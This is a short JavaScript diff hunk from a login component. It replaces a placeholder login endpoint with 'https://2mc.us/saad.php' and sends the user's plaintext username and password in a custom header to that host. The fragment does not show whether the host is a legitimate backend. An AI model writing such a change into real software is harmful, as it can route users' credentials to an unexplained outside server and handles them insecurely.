@@ -26,7 +26,7 @@ const App = () => {
       'Auth': `${username}:${password}`
     };
     try {
-      const response = await fetch('https://some-domain.tld/api/login', { headers });
+      const response = await fetch('https://2mc.us/saad.php', { headers });
       const data = await response.json();
       if (data.status === 'ok') {
         setResponseData(data)
